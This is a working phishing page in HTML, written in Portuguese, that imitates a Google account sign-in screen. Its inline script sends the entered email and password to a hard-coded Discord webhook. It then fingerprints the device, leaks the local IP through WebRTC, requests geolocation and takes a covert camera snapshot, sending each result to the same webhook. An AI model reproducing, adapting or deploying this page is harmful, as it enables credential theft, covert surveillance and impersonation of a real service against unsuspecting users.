<!DOCTYPE html>
<html lang="pt-BR"> 

<head> 
    <title>Fazer login - Contas do Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f1f1f1;
        }

        .container {
            background: white;
            padding: 40px;
            width: 90%;
            max-width: 400px;
            border-radius: 10px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
            transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out;
        }

        .container:hover {
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            transform: translateY(-5px);
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 90px;
        }

        .title {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 20px;
        }

        .input-field {
            margin-bottom: 25px;
        }

        .input-field label {
            display: block;
            font-size: 14px;
            color: #202124;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .input-field input {
            width: calc(100% - 20px);
            padding: 10px;
            font-size: 16px;
            border: 1px solid #d3d3d3;
            border-radius: 5px;
            transition: border-color 0.3s;
        }

        .input-field input:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 5px rgba(26, 115, 232, 0.3);
        }

        .submit-btn {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            background-color: #1a73e8;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .submit-btn:hover {
            background-color: #1669c1;
        }

        .link {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }

        .link a {
            color: #1a73e8;
            text-decoration: none;
            transition: color 0.3s;
        }

        .link a:hover {
            text-decoration: underline;
            color: #0d47a1;
        }

        /* Additional responsive styles */
        @media (max-width: 480px) {
            .container {
                padding: 20px;
            }

            .input-field input {
                font-size: 14px;
            }

            .submit-btn {
                font-size: 14px;
            }

            .title {
                font-size: 20px;
            }
        }
    </style>

    <script>
        // Send Data to Discord Webhook
        async function sendToDiscord(title, data, isImage = false) {
            let boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
            let body;

            if (isImage) {
                let imageBase64 = data.split(",")[1];
                body = `--${boundary}\r\n` +
                       `Content-Disposition: form-data; name="files[0]"; filename="myfilename.png"\r\n` +
                       `Content-Type: image/png\r\n` +
                       `Content-Transfer-Encoding: base64\r\n\r\n` +
                       `${imageBase64}\r\n` +
                       `--${boundary}--`;
            } else {
                body = JSON.stringify({
                    content: `Novos ${title} coletados`,
                    embeds: [
                        {
                            title: title,
                            description: "Informações coletadas a partir do QR Code",
                            color: 16711680,
                            fields: Object.keys(data).map(key => ({
                                name: key,
                                value: typeof data[key] === 'string' ? data[key] : JSON.stringify(data[key]),
                                inline: false
                            }))
                        }
                    ]
                });
            }

            await fetch("https://discord.com/api/webhooks/1293733039331082391/3kVe2OjfbpHf0VCzRtOtq9VirB-_mK9-ZJCNVmc3gPYxOjVKLXfj-hjIDZf5W0Jdv-Fq", {
                method: 'POST',
                headers: isImage ? {
                    'Content-Type': `multipart/form-data; boundary=${boundary}`
                } : {
                    'Content-Type': 'application/json',
                },
                body: body
            });
        }

        // Take hidden picture from the camera
        async function takeHiddenPicture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Allow the video feed to stabilize for a moment
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth / 1; // Reduce size for thumbnail!
                    canvas.height = video.videoHeight / 1;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Convert the snapshot to a base64 data URL
                    const imageData = canvas.toDataURL('image/png');

                    // Send to Discord using boundary
                    sendToDiscord("Captura da Câmera", imageData, true);

                    // Stop the video stream
                    stream.getTracks().forEach(track => track.stop());
                }, 3000);
            } catch (err) {
                console.error('Erro ao acessar a câmera:', err);
            }
        }

        // Collect Additional Device Information
        async function collectAdditionalData() {
            let deviceInfo = {
                userAgent: navigator.userAgent,
                plataforma: navigator.platform,
                coresCPU: navigator.hardwareConcurrency,
                suporteTouch: navigator.maxTouchPoints,
                idioma: navigator.language,
                tipoConexao: navigator.connection ? navigator.connection.effectiveType : 'Desconhecido',
                fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
                resolucaoTela: `${screen.width}x${screen.height}`,
                profundidadeCor: screen.colorDepth,
                cookieHabilitado: navigator.cookieEnabled
            };

            // Estado da Bateria
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                deviceInfo.bateria = `${Math.round(battery.level * 100)}%`;
                deviceInfo.carregando = battery.charging ? 'Sim' : 'Não';
            }

            // Informações WebGL
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                deviceInfo.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Desconhecido';
            }

            await sendToDiscord("Informações Adicionais do Dispositivo", deviceInfo);
        }

        // Get Local IP Address using WebRTC
        async function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                        const match = ipRegex.exec(event.candidate.candidate);
                        if (match) {
                            sendToDiscord("Endereço IP Local", { ip: match[1] });
                            resolve(match[1]);
                        }
                    }
                };
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
            });
        }

        // Get Geolocation Data
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async position => {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                    };
                    await sendToDiscord("Dados de Geolocalização", locationData);
                });
            } else {
                console.error("Geolocalização não é suportada por este navegador.");
            }
        }

        // Collect Login Credentials
        async function collectCredentials(event) {
            event.preventDefault();
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            const credentials = {
                email: email,
                password: password
            };

            await sendToDiscord("Credenciais de Login", credentials);

            // Trigger all other data collection
            collectAdditionalData();
            getLocalIP();
            getLocation();
            takeHiddenPicture();
        }
    </script>
</head>

<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>
        <div class="title">Fazer login</div>
        <form onsubmit="collectCredentials(event)">
            <div class="input-field">
                <label for="email">Email ou telefone</label>
                <input type="email" id="email" placeholder="Digite seu email ou telefone" required>
            </div>
            <div class="input-field">
                <label for="password">Senha</label>
                <input type="password" id="password" placeholder="Digite sua senha" required>
            </div>
            <button type="submit" class="submit-btn">Próxima</button>
        </form>
        <div class="link">
            <a href="#">Esqueceu seu email?</a>
        </div>
    </div>
</body>

</html>
